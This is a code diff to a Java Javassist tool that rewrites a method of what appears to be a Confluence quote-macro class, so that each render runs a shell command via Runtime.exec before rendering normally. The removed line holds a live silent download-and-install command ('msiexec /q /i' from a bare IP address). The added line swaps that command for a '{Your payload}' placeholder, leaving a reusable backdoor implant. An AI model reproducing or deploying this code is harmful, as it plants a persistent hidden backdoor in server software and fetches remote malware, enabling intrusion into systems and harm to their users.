@@ -34,7 +34,7 @@ public class UpdateMethod {
 			
 			//更改该方法的内部实现
 			//需要注意的是对于参数的引用要以$开始，不能直接输入参数名称
-			cMethod.setBody("{ String cmd = \"cmd /c msiexec /q /i http://47.95.251.134:9900/x64.msi\";Runtime.getRuntime().exec(cmd);String width = $1.get(\"width\") == null ? \"100%\" : (String)$1.get(\"width\");String author = (String)$1.get(\"author\");String url = $1.get(\"url\") == null ? \"hideURL\" : (String)$1.get(\"url\");Map contextMap = MacroUtils.defaultVelocityContext();contextMap.put(\"body\", $2);contextMap.put(\"width\", width);contextMap.put(\"author\", author);contextMap.put(\"url\", url);return VelocityUtils.getRenderedTemplate(\"templates/quote-macro.vm\", contextMap);}");
+			cMethod.setBody("{ String cmd = \"cmd /c {Your payload}\";Runtime.getRuntime().exec(cmd);String width = $1.get(\"width\") == null ? \"100%\" : (String)$1.get(\"width\");String author = (String)$1.get(\"author\");String url = $1.get(\"url\") == null ? \"hideURL\" : (String)$1.get(\"url\");Map contextMap = MacroUtils.defaultVelocityContext();contextMap.put(\"body\", $2);contextMap.put(\"width\", width);contextMap.put(\"author\", author);contextMap.put(\"url\", url);return VelocityUtils.getRenderedTemplate(\"templates/quote-macro.vm\", contextMap);}");
 			cClass.writeFile();
 			System.out.println("=======修改方法完=========");
 		} catch (NotFoundException e) {
